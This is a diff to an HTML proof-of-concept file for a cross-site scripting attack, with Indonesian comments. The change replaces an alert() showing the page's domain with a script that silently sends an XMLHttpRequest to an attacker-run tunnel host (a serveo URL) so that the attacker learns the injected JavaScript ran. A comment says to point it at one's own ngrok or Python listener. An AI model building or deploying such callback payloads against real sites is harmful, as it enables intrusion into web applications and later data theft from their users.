@@ -1,10 +1,15 @@
+
 <!DOCTYPE html>
 <html>
 <body>
-    <h2>Shuvy XSS Proof of Concept</h2>
+    <h1>Shuvy Catcher PoC</h1>
     <script>
-        // Kita tes eksekusi JS dasar tanpa menyentuh Bridge dulu
-        alert("XSS Berhasil, Zeeinch! Domain: " + document.domain);
+        // GANTI URL ini dengan IP Publik/Domain Ngrok dari server Python-mu!
+        var target = "https://4fe64a0eb753c185-203-83-40-39.serveousercontent.com/?bukti=js_tereksekusi";
+        
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", target, true);
+        xhr.send();
     </script>
 </body>
 </html>
